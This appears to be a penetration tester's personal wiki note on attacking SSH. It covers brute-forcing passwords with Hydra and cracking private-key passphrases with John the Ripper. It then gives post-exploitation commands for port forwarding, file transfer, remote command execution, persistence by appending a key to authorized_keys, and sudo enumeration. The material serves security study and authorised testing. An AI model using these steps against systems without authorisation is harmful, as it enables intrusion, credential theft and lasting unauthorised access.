---
id: Exploitation
aliases: []
tags:
  - Networking/Services/SSH/Exploitation
links: "[[SSH]]"
---

<!-- Exploitation {{{-->
# Exploitation

<!-- Brute Force {{{-->
## Brute Force

<!-- Passwords {{{-->
### Passwords

Brute force passwords with [[Hydra]]

```sh
hydra -l user -P </path/to/wordlist.txt> ssh://<target>
```

<!-- }}} -->

<!-- SSH Keys {{{-->
### SSH Keys

Brute force SSH keys with [[John The Ripper]]

> [!example]-
>
> 1. Create a `John`-compatible hash
>
> ```sh
> /usr/share/john/ssh2john.py id_rsa > id_rsa.hash
> ```
>
> 2. Run `John` against the hash
>
> ```sh
> john --wordlist=<path/to/wordlist.txt> id_rsa.hash
> ```

<!-- }}} -->

___

<!-- }}} -->

<!-- }}} -->

<!-- Post-Exploitation {{{-->
# Post-Exploitation

<!-- Port Forwarding {{{-->
## Port Forwarding

> [!todo]
>
> [[General#Port Forwarding]]

Forward local ports to the attacker's machine
to access network services on the target's network

Local Port Forwarding

```sh
ssh -L <local_port>:<remote_host>:<remote_port> <user>@<ssh_server>
```

> [!example]-
>
> Forward a local host's port to a remote host's port
>
> ```sh
> ssh -N -L 8080:10.0.0.25:80 alice@198.51.100.5
> ```
>
> - `N`: Don't open a remote shell (*tunnel only*)

Remote Port Forwarding

```sh
ssh -R <remote_port>:<local_host>:<local_port> <user>@<ssh_server>
```

> [!todo]
>
> SSH Tunneling
>
> ```sh
> ssh -D 8080 user@X.X.X.X
> ```

___

<!-- }}} -->

<!-- File Transfer {{{-->
## File Transfer

### SCP

File transfer with SCP
([Secure Copy Protocol](https://en.wikipedia.org/wiki/Secure_copy_protocol))

Download files

```sh
scp <user>@<target>:</path/to/remote/file> </path/to/local/destination>
```

Upload files

```sh
scp </path/to/local/file> <user>@<target>:</path/to/remote/destination>
```

### SFTP

File transfer with SFTP
([SSH File Transfer Protocol](https://en.wikipedia.org/wiki/SSH_File_Transfer_Protocol))

```sh
sftp <user>@<target>
```

___

<!-- }}} -->

<!-- Command Execution {{{-->
## Command Execution

Run an arbitrary command on the remote host

```sh
ssh <user>@<target> '<command>'
```

___

<!-- }}} -->

<!-- Maintaining Access {{{-->
## Maintaining Access

Add an SSH public key to the authorized keys

```sh
echo <public_key> >> ~/.ssh/authorized_keys
```
___

<!-- }}} -->

<!-- Privilege Escalation {{{-->
## Privilege Escalation

Leverage local vulnerabilities or misconfigurations to elevate privileges

```sh
ssh <user>@<target> 'sudo -l'
```

___

<!-- }}} -->

<!-- }}} -->
